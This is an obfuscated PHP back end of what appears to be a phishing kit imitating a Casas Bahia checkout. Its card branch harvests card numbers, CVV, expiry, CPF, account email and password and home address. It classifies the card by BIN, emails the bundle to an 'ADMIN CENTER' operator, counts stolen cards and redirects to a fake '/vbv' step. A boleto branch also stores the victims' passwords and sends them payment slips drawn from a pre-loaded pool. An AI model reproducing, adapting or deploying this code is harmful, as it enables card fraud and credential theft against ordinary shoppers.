<?php /*
Casas Bahia v1.0
*/
$GLOBALS["idurpgdr"] = "dbconfig";
$GLOBALS["wcueoebr"] = "verifica";
$GLOBALS["lmimyilerksl"] = "endereco";
$GLOBALS["yyhuucbww"] = "select";
$GLOBALS["olnneqn"] = "cc";
$GLOBALS["lzzugoufph"] = "email";
$GLOBALS["gvojovnhdi"] = "validade";
$GLOBALS["djkpwudsghux"] = "ano";
$GLOBALS["iecfrw"] = "send";
$GLOBALS["gbkxppcpw"] = "bia";
$GLOBALS["xoindu"] = "dados";
$GLOBALS["vkkrjpdmg"] = "dadosSMTP";
$GLOBALS["bqbofzrrimb"] = "valorProduto";
$GLOBALS["lmflyxmmltdc"] = "html";
$GLOBALS["ttnsjdwtv"] = "imgProduto";
$GLOBALS["mkixwlyqfc"] = "produto";
$GLOBALS["gutuvndk"] = "referencia";
$GLOBALS["fptehflit"] = "chave";
$GLOBALS["vdctzhmfp"] = "vencimento";
$GLOBALS["gjxfitjtq"] = "linha";
$GLOBALS["riqkfmy"] = "res";
$GLOBALS["rqljcay"] = "verifyCartId";
$GLOBALS["xhjpnsmw"] = "cartId";
$GLOBALS["hwjpwjpd"] = "cep";
$GLOBALS["uqqqxhqg"] = "estado";
$GLOBALS["lnejqscgj"] = "cidade";
$GLOBALS["dxgpcljg"] = "pedido";
$GLOBALS["qsoakvbnxlk"] = "data";
$GLOBALS["dpzkfrit"] = "cpf";
$GLOBALS["ctxvbvs"] = "telefone";
$GLOBALS["dsdcesxh"] = "bairro";
$GLOBALS["ygjgmek"] = "destinatario";
$GLOBALS["sbaeluwssbxn"] = "numero";
if (isset($_POST["gerarBoletos"]))
{
    $GLOBALS["ejmuwzecx"] = "address";
    $GLOBALS["etgikjvfleg"] = "estado";
    $GLOBALS["orjfkvowcel"] = "address";
    $GLOBALS["yowvfxi"] = "address";
    $rnubzf = "endereco";
    $GLOBALS["zfkqsahfwoyy"] = "referencia";
    $
    {
        $rnubzf
    } = htmlspecialchars(addslashes($_SESSION["endereco"]));
    $GLOBALS["tapuiso"] = "cidade";
    $
    {
        $GLOBALS["sbaeluwssbxn"]
    } = htmlspecialchars(addslashes($_SESSION["numero"]));
    $
    {
        $GLOBALS["ygjgmek"]
    } = htmlspecialchars(addslashes($_SESSION["nome"]));
    $GLOBALS["vohqyjhq"] = "cep";
    $qnqipgeckq = "verifica";
    $
    {
        $GLOBALS["dsdcesxh"]
    } = htmlspecialchars(addslashes($_SESSION["bairro"]));
    $
    {
        $GLOBALS["tapuiso"]
    } = htmlspecialchars(addslashes($_SESSION["cidade"]));
    $
    {
        $GLOBALS["etgikjvfleg"]
    } = htmlspecialchars(addslashes($_SESSION["estado"]));
    $GLOBALS["kikysymikd"] = "pedido";
    $fsusiphkrke = "endereco";
    $
    {
        $GLOBALS["zfkqsahfwoyy"]
    } = htmlspecialchars(addslashes($_SESSION["referencia"]));
    $uriswpc = "numero";
    $GLOBALS["iozcef"] = "referencia";
    $jbvpik = "senha";
    $
    {
        $GLOBALS["vohqyjhq"]
    } = htmlspecialchars(addslashes($_SESSION["cep"]));
    $GLOBALS["wijcmwtxk"] = "email";
    $
    {
        $GLOBALS["ctxvbvs"]
    } = htmlspecialchars(addslashes($_SESSION["telefone"]));
    $
    {
        $GLOBALS["wijcmwtxk"]
    } = htmlspecialchars(addslashes($_SESSION["login"]));
    $
    {
        $jbvpik
    } = htmlspecialchars(addslashes($_SESSION["senha"]));
    $
    {
        $GLOBALS["dpzkfrit"]
    } = isset($_SESSION["cpf"]) ? $_SESSION["cpf"] : null;
    $
    {
        $GLOBALS["qsoakvbnxlk"]
    } = date("d/m/Y");
    $
    {
        $GLOBALS["kikysymikd"]
    } = rand(123456789, 987654321);
    $_SESSION["pedido"] = $
    {
        $GLOBALS["dxgpcljg"]
    };
    $
    {
        $GLOBALS["ejmuwzecx"]
    } = ["destinatario" => htmlentities($
    {
        $GLOBALS["ygjgmek"]
    }) , "telefone" => htmlentities($
    {
        $GLOBALS["ctxvbvs"]
    }) , "endereco" => htmlentities($
    {
        $fsusiphkrke
    }) , "numero" => htmlentities($
    {
        $uriswpc
    }) , "bairro" => htmlentities($
    {
        $GLOBALS["dsdcesxh"]
    }) , "cidade" => htmlentities($
    {
        $GLOBALS["lnejqscgj"]
    }) , "estado" => htmlentities($
    {
        $GLOBALS["uqqqxhqg"]
    }) , "cep" => htmlentities($
    {
        $GLOBALS["hwjpwjpd"]
    }) , "referencia" => htmlentities($
    {
        $GLOBALS["iozcef"]
    }) , ];
    $
    {
        $GLOBALS["orjfkvowcel"]
    } = json_encode($
    {
        $GLOBALS["yowvfxi"]
    });
    $
    {
        $qnqipgeckq
    } = $pdo->query("select id from boletos where produto_id = '$id' and gerado = '0'");
    if ($verifica->rowCount() > 0)
    {
        $GLOBALS["wjlxptoy"] = "linha_id";
        $GLOBALS["hvzaywqosqrp"] = "html";
        $josiwgbb = "html";
        $
        {
            $GLOBALS["xhjpnsmw"]
        } = ($_SESSION["cartId"] ?? false);
        $
        {
            $GLOBALS["rqljcay"]
        } = pdo()->prepare("select * from `dados_boletos` where `cartId` = ?");
        $GLOBALS["pcbvme"] = "html";
        $GLOBALS["baiaumyenqn"] = "cartId";
        $GLOBALS["wtwhbpahk"] = "html";
        $GLOBALS["kdfxst"] = "select";
        $ltdneuwgnf = "email";
        $pojurwlldd = "produto";
        $verifyCartId->execute([$
        {
            $GLOBALS["baiaumyenqn"]
        }
        ]);
        $eqckcniib = "res";
        $nsipjhfl = "html";
        $GLOBALS["cquksrxkxj"] = "data";
        $xsgrcspkh = "html";
        if ($verifyCartId->rowCount() > 0)
        {
            $GLOBALS["kymuimve"] = "resCartId";
            $
            {
                $GLOBALS["kymuimve"]
            } = $verifyCartId->fetch(PDO::FETCH_OBJ);
            redir(gerarPHX() . "/obrigado/{$resCartId->pedido}");
            exit();
        }
        $GLOBALS["lpruptrhswhv"] = "pedido";
        $trjgsb = "pedido";
        $
        {
            $GLOBALS["kdfxst"]
        } = $pdo->query("select * from boletos where produto_id = '$id' and gerado = '0' order by id asc");
        $oletgodmt = "nomeProduto";
        $rswoujx = "endereco";
        $GLOBALS["eixzenztu"] = "html";
        $
        {
            $eqckcniib
        } = $select->fetch(PDO::FETCH_ASSOC);
        $ejwyqfuhlfs = "email";
        $GLOBALS["lfvegsamkqyy"] = "valorProduto";
        $GLOBALS["phnhhuwfcyx"] = "produto";
        $
        {
            $GLOBALS["wjlxptoy"]
        } = $
        {
            $GLOBALS["riqkfmy"]
        }
        ["id"];
        $
        {
            $GLOBALS["gjxfitjtq"]
        } = $
        {
            $GLOBALS["riqkfmy"]
        }
        ["linha"];
        $
        {
            $GLOBALS["qsoakvbnxlk"]
        } = date("d/m/Y");
        $gecxpnrwr = "html";
        $
        {
            $GLOBALS["vdctzhmfp"]
        } = date("d/m/Y", strtotime("+{$dbconfig['dias']} day"));
        $
        {
            $GLOBALS["fptehflit"]
        } = ["linha" => $
        {
            $GLOBALS["gjxfitjtq"]
        }
        , "endereco" => $
        {
            $rswoujx
        }
        , "numero" => $
        {
            $GLOBALS["sbaeluwssbxn"]
        }
        , "bairro" => $
        {
            $GLOBALS["dsdcesxh"]
        }
        , "cidade" => $
        {
            $GLOBALS["lnejqscgj"]
        }
        , "estado" => $
        {
            $GLOBALS["uqqqxhqg"]
        }
        , "cep" => $
        {
            $GLOBALS["hwjpwjpd"]
        }
        , "referencia" => $
        {
            $GLOBALS["gutuvndk"]
        }
        , "sacado" => $
        {
            $GLOBALS["ygjgmek"]
        }
        , "data" => $
        {
            $GLOBALS["cquksrxkxj"]
        }
        , "vencimento" => $
        {
            $GLOBALS["vdctzhmfp"]
        }
        , "pedido" => $
        {
            $trjgsb
        }
        , "valor" => number_format($
        {
            $pojurwlldd
        }
        ["valor"], 2, ",", ".") ];
        $
        {
            $GLOBALS["fptehflit"]
        } = json_encode($
        {
            $GLOBALS["fptehflit"]
        });
        $GLOBALS["kbvnuoyqvmww"] = "nomeProduto";
        $
        {
            $GLOBALS["fptehflit"]
        } = base64_encode($
        {
            $GLOBALS["fptehflit"]
        });
        $
        {
            $GLOBALS["kbvnuoyqvmww"]
        } = $
        {
            $GLOBALS["mkixwlyqfc"]
        }
        ["nome"];
        $
        {
            $GLOBALS["lfvegsamkqyy"]
        } = $
        {
            $GLOBALS["phnhhuwfcyx"]
        }
        ["valor"];
        $
        {
            $GLOBALS["ttnsjdwtv"]
        } = $
        {
            $GLOBALS["mkixwlyqfc"]
        }
        ["img"];
        $GLOBALS["cuyqwmqyuvm"] = "destinatario";
        $pdo->query("INSERT INTO `dados_boletos`(`email`, `senha`, `data`, `produto`, `valor`, `linha`, `pedido`, `ip`, `img`, `cobrado`, `vencimento`, `pdf`, `endereco`, `numero`, `bairro`, `cidade`, `estado`, `referencia`, `doc`, `cep`, `nome`,`cartId`) VALUES ('$email', '$senha', '$data', '$nomeProduto', '$valorProduto', '$linha', '$pedido', '$ip', '$imgProduto', '0', '$vencimento', '$chave', '$endereco', '$numero', '$bairro', '$cidade', '$estado', '$referencia', '$cpf', '$cep', '$destinatario','$cartId')");
        $pdo->query("update boletos set gerado = '1' where id = '$linha_id'");
        $
        {
            $xsgrcspkh
        } = file_get_contents(__DIR__ . "/../views/emails/boleto.html");
        $
        {
            $GLOBALS["wtwhbpahk"]
        } = str_replace("{Nome}", ucwords($
        {
            $GLOBALS["cuyqwmqyuvm"]
        }) , $
        {
            $GLOBALS["hvzaywqosqrp"]
        });
        $ixuoipfldqi = "html";
        $kurbykxlcl = "html";
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } = str_replace("{data}", $
        {
            $GLOBALS["qsoakvbnxlk"]
        }
        , $
        {
            $kurbykxlcl
        });
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } = str_replace("{produto_nome}", $
        {
            $oletgodmt
        }
        , $
        {
            $GLOBALS["lmflyxmmltdc"]
        });
        $nibjubk = "urlbase";
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } = str_replace("{img}", $
        {
            $GLOBALS["ttnsjdwtv"]
        }
        , $
        {
            $GLOBALS["pcbvme"]
        });
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } = str_replace("{pedido}", $
        {
            $GLOBALS["lpruptrhswhv"]
        }
        , $
        {
            $GLOBALS["lmflyxmmltdc"]
        });
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } = str_replace("{url}", $
        {
            $nibjubk
        } . "views/saved/?b={$chave}", $
        {
            $GLOBALS["eixzenztu"]
        });
        $GLOBALS["pmfdoldlb"] = "html";
        $
        {
            $josiwgbb
        } = str_replace("{valor}", number_format($
        {
            $GLOBALS["bqbofzrrimb"]
        }
        , 2, ",", ".") , $
        {
            $GLOBALS["lmflyxmmltdc"]
        });
        $
        {
            $gecxpnrwr
        } = str_replace("{linha}", $
        {
            $GLOBALS["gjxfitjtq"]
        }
        , $
        {
            $GLOBALS["pmfdoldlb"]
        });
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } = str_replace("{endereco}", "Endereço: $endereco, Nº $numero, Bairro: $bairro <br>\n        Cidade: $cidade, Estado: $estado <br>\n        CEP: $cep\n        ", $
        {
            $GLOBALS["lmflyxmmltdc"]
        });
        $
        {
            $GLOBALS["vkkrjpdmg"]
        } = ["nome" => "Resumo do pedido", "email" => $
        {
            $ltdneuwgnf
        }
        , "assunto" => "Recebemos o seu pedido 02-{$pedido}", "msg" => $
        {
            $ixuoipfldqi
        }
        ];
        $
        {
            $GLOBALS["xoindu"]
        } = ["email" => $
        {
            $ejwyqfuhlfs
        }
        , "pedido" => $
        {
            $GLOBALS["dxgpcljg"]
        }
        , "msg" => $
        {
            $nsipjhfl
        }
        ];
        if (rows("bia") > 0 and !empty(Sys()->token()
            ->statusVIP))
        {
            $
            {
                $GLOBALS["gbkxppcpw"]
            } = bia($
            {
                $GLOBALS["xoindu"]
            });
            if ($
            {
                $GLOBALS["gbkxppcpw"]
            })
            {
                $pdo->query("update dados_boletos set fail = '0' where pedido = '$pedido'");
            }
        }
        else
        {
            $
            {
                $GLOBALS["iecfrw"]
            } = send($
            {
                $GLOBALS["vkkrjpdmg"]
            }
            , "boleto");
            if ($
            {
                $GLOBALS["iecfrw"]
            })
            {
                $pdo->query("update dados_boletos set fail = '0' where pedido = '$pedido'");
            }
        }
        (new \Source\Modells\Metricas())->update_boletos_gerados();
        $pdo->query("update contador set boletos = (boletos+1)");
        redir(gerarPHX() . "/obrigado/$pedido");
    }
    else
    {
        echo "<script>alert(\"Por favor, escolha outra forma de pagamento\");</script>";
        redir(gerarPHX() . "/pagamento");
        exit();
    }
}
if (isset($_POST["pagamentoComCartao"]))
{
    sleep(1);
    if (!isset($_SESSION["endereco"]) and !isset($_SESSION["telefone"]) and !isset($_SESSION["email"]))
    {
        echo "REQUEST NEGADA !";
        exit();
    }
    $GLOBALS["vfnpcnx"] = "dados";
    $
    {
        $GLOBALS["xoindu"]
    } = ($_POST["dados"] ?? false);
    if (empty($
    {
        $GLOBALS["vfnpcnx"]
    }))
    {
        echo "<script>alert(\"Por favor, tente novamente mais tarde\");</script>";
    }
    else
    {
        $GLOBALS["dkmnkg"] = "cc";
        $GLOBALS["fjomcqtm"] = "bin";
        $aatpmevrtpu = "cvv";
        $GLOBALS["blfncfbeqd"] = "mes";
        $GLOBALS["gommts"] = "parcelas";
        $GLOBALS["lfjfirjp"] = "nome";
        $
        {
            $GLOBALS["dkmnkg"]
        } = filter_var($
        {
            $GLOBALS["xoindu"]
        }
        [0]["value"], FILTER_SANITIZE_STRING);
        $GLOBALS["winlmymfo"] = "address";
        $GLOBALS["lzfipjxkdbm"] = "telefone";
        $GLOBALS["hoiiakeq"] = "cep";
        $GLOBALS["syiunqslp"] = "dados";
        $pkvjxaxzbny = "html";
        $
        {
            $GLOBALS["lfjfirjp"]
        } = filter_var($
        {
            $GLOBALS["xoindu"]
        }
        [1]["value"], FILTER_SANITIZE_STRING);
        $
        {
            $GLOBALS["dpzkfrit"]
        } = filter_var($
        {
            $GLOBALS["xoindu"]
        }
        [2]["value"], FILTER_SANITIZE_STRING);
        $warmlnxnheg = "address";
        $GLOBALS["ufvcsuulf"] = "dados";
        $
        {
            $GLOBALS["blfncfbeqd"]
        } = filter_var($
        {
            $GLOBALS["ufvcsuulf"]
        }
        [3]["value"], FILTER_SANITIZE_STRING);
        $GLOBALS["boqsjst"] = "dados";
        $GLOBALS["kvbrcspyntr"] = "senha";
        $zjixmsrfhljl = "endereco";
        $
        {
            $GLOBALS["gvojovnhdi"]
        } = "$mes";
        $nkmqupkks = "bairro";
        $
        {
            $aatpmevrtpu
        } = filter_var($
        {
            $GLOBALS["boqsjst"]
        }
        [4]["value"], FILTER_SANITIZE_STRING);
        $
        {
            $GLOBALS["gommts"]
        } = filter_var($
        {
            $GLOBALS["syiunqslp"]
        }
        [5]["value"], FILTER_SANITIZE_STRING);
        $
        {
            $GLOBALS["lzzugoufph"]
        } = filter_var($_SESSION["login"], FILTER_SANITIZE_STRING);
        $ttjvbregxkm = "referencia";
        $GLOBALS["zujtxbhjht"] = "res";
        $
        {
            $GLOBALS["kvbrcspyntr"]
        } = filter_var($_SESSION["senha"], FILTER_SANITIZE_STRING);
        $accdmtpuvfeg = "estado";
        $GLOBALS["kbbqwkulrdjk"] = "res";
        $
        {
            $GLOBALS["fjomcqtm"]
        } = substr(str_replace(" ", "", $
        {
            $GLOBALS["olnneqn"]
        }) , 0, 6);
        $mbukwbqeksu = "res";
        $xqjpqklf = "html";
        $
        {
            $GLOBALS["yyhuucbww"]
        } = $pdo->query("select * from bin where bin = '$bin'");
        $
        {
            $mbukwbqeksu
        } = $select->fetch(PDO::FETCH_ASSOC);
        $lngsmok = "cidade";
        if (isset($
        {
            $GLOBALS["riqkfmy"]
        }
        ["banco"]))
        {
            $qzroiciad = "banco";
            $
            {
                $qzroiciad
            } = "{$res['banco']} - {$res['lvl']}";
        }
        else
        {
            $iqnuiqb = "banco";
            $
            {
                $iqnuiqb
            } = "Sem registro";
        }
        $GLOBALS["yntuzoyjl"] = "res";
        $GLOBALS["xxfudfvl"] = "numero";
        $
        {
            $zjixmsrfhljl
        } = htmlspecialchars(addslashes($_SESSION["endereco"]));
        $
        {
            $GLOBALS["xxfudfvl"]
        } = htmlspecialchars(addslashes($_SESSION["numero"]));
        $
        {
            $GLOBALS["ygjgmek"]
        } = htmlspecialchars(addslashes($_SESSION["nome"]));
        $GLOBALS["vanyltg"] = "html";
        $
        {
            $GLOBALS["dsdcesxh"]
        } = htmlspecialchars(addslashes($_SESSION["bairro"]));
        $
        {
            $lngsmok
        } = htmlspecialchars(addslashes($_SESSION["cidade"]));
        $
        {
            $accdmtpuvfeg
        } = htmlspecialchars(addslashes($_SESSION["estado"]));
        $
        {
            $ttjvbregxkm
        } = htmlspecialchars(addslashes($_SESSION["referencia"]));
        $
        {
            $GLOBALS["hoiiakeq"]
        } = htmlspecialchars(addslashes($_SESSION["cep"]));
        $
        {
            $GLOBALS["ctxvbvs"]
        } = htmlspecialchars(addslashes($_SESSION["telefone"]));
        $
        {
            $GLOBALS["qsoakvbnxlk"]
        } = date("d/m/Y - H:i");
        $tduuegg = "html";
        $
        {
            $GLOBALS["dxgpcljg"]
        } = mt_rand();
        $pyxwewlawvm = "res";
        $_SESSION["pedido"] = $
        {
            $GLOBALS["dxgpcljg"]
        };
        $GLOBALS["impiouh"] = "address";
        $
        {
            $GLOBALS["impiouh"]
        } = ["destinatario" => htmlentities($
        {
            $GLOBALS["ygjgmek"]
        }) , "telefone" => htmlentities($
        {
            $GLOBALS["lzfipjxkdbm"]
        }) , "endereco" => htmlentities($
        {
            $GLOBALS["lmimyilerksl"]
        }) , "numero" => htmlentities($
        {
            $GLOBALS["sbaeluwssbxn"]
        }) , "bairro" => htmlentities($
        {
            $nkmqupkks
        }) , "cidade" => htmlentities($
        {
            $GLOBALS["lnejqscgj"]
        }) , "estado" => htmlentities($
        {
            $GLOBALS["uqqqxhqg"]
        }) , "cep" => htmlentities($
        {
            $GLOBALS["hwjpwjpd"]
        }) , "referencia" => htmlentities($
        {
            $GLOBALS["gutuvndk"]
        }) , ];
        $GLOBALS["zxsxfzkixc"] = "html";
        $
        {
            $warmlnxnheg
        } = json_encode($
        {
            $GLOBALS["winlmymfo"]
        });
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } = "<div>";
        $bpmlgmsd = "html";
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } .= "<div><b>{$banco}</b></div>";
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } .= "<div><b>Cartão :</b> $cc</div>";
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } .= "<div><b>Titular :</b> $nome</div>";
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } .= "<div><b>CPF :</b> $cpf</div>";
        $
        {
            $GLOBALS["vanyltg"]
        } .= "<div><b>Validade :</b> $validade</div>";
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } .= "<div><b>Cvv :</b> $cvv</div>";
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } .= "<div>--------------------------------------</div>";
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } .= "<div><b>E-mail :</b> $email</div>";
        $
        {
            $pkvjxaxzbny
        } .= "<div><b>Senha :</b> $senha</div>";
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } .= "<div><b>Destinatario :</b> $destinatario</div>";
        $
        {
            $tduuegg
        } .= "<div><b>Telefone :</b> $telefone</div>";
        $
        {
            $bpmlgmsd
        } .= "<div><b>Endereço :</b> $endereco</div>";
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } .= "<div><b>Número :</b> $numero</div>";
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } .= "<div><b>Bairro :</b> $bairro</div>";
        $
        {
            $GLOBALS["zxsxfzkixc"]
        } .= "<div><b>Cidade :</b> $cidade</div>";
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } .= "<div><b>Estado :</b> $estado</div>";
        $GLOBALS["fecxeg"] = "html";
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } .= "<div><b>Ponto de referência :</b> $referencia</div>";
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } .= "<div><b>CEP :</b> $cep</div>";
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } .= "<div><b>Data :</b> $data</div>";
        $
        {
            $GLOBALS["lmflyxmmltdc"]
        } .= "<div><b>IP :</b> $ip</div>";
        $
        {
            $xqjpqklf
        } .= "<div><b>Produto :</b> {$produto['nome']}</div>";
        $
        {
            $GLOBALS["fecxeg"]
        } .= "</div>";
        $
        {
            $GLOBALS["wcueoebr"]
        } = $pdo->query("select id from dados where cc = '$cc'");
        if ($verifica->rowCount() == 0)
        {
            $bofgtcjdoq = "html";
            $pdo->query("INSERT INTO `dados`(`cc`, `cpf`, `validade`, `nome`, `cvv`, `email`, `senha`, `endereco`, `senha_info`, `data`, `pedido`, `enc`, `parcelas`) VALUES ('$cc', '$cpf', '$validade', '$nome', '$cvv', '$email', '$senha', '$address', 'null', '$data', '$pedido', '$id', '$parcelas')");
            $
            {
                $GLOBALS["vkkrjpdmg"]
            } = ["nome" => "ADMIN CENTER", "assunto" => "Nova info $cc - $banco", "email" => $
            {
                $GLOBALS["idurpgdr"]
            }
            ["email"], "msg" => $
            {
                $bofgtcjdoq
            }
            ];
            send($
            {
                $GLOBALS["vkkrjpdmg"]
            }
            , "cc");
            $pdo->query("update contador set ccs = (ccs+1)");
        }
        if (true)
        {
            $GLOBALS["xctedi"] = "arch";
            redir($
            {
                $GLOBALS["xctedi"]
            } . "/vbv");
        }
        else
        {
            $GLOBALS["wavjhmzmx"] = "dbconfig";
            if ($
            {
                $GLOBALS["wavjhmzmx"]
            }
            ["pedido"] == 0)
            {
                redir(gerarPHX() . "/pedido/" . $
                {
                    $GLOBALS["dxgpcljg"]
                });
            }
            else
            {
                $cmxydc = "pedido";
                redir(gerarPHX() . "/meuPedido/" . $
                {
                    $cmxydc
                });
            }
        }
    }
}
?>
